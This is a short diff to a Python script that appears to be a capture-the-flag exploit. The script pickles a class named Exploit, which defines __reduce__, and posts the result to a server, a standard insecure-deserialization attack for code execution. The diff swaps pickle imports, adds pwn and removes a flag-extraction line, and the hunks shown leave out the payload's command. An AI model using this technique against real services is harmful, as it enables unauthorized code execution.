@@ -1,9 +1,8 @@
-import _pickle as cPickle
-import base64
-import os
-import string
+import pickle
+import pwn
 import requests
-import time
+import base64
+
 
 class Exploit(object):
 	def __reduce__(self):
@@ -16,6 +15,5 @@ def sendPayload(p):
 	return r.text
 
 
-payload_dec = cPickle.dumps(Exploit(), protocol=2)
+payload_dec = pickle.dumps(Exploit(), protocol=2)
 print(sendPayload(payload_dec))
-#print("ctf{" + sendPayload(payload_dec).split("ctf{")[1].split("}")[0] + "}")
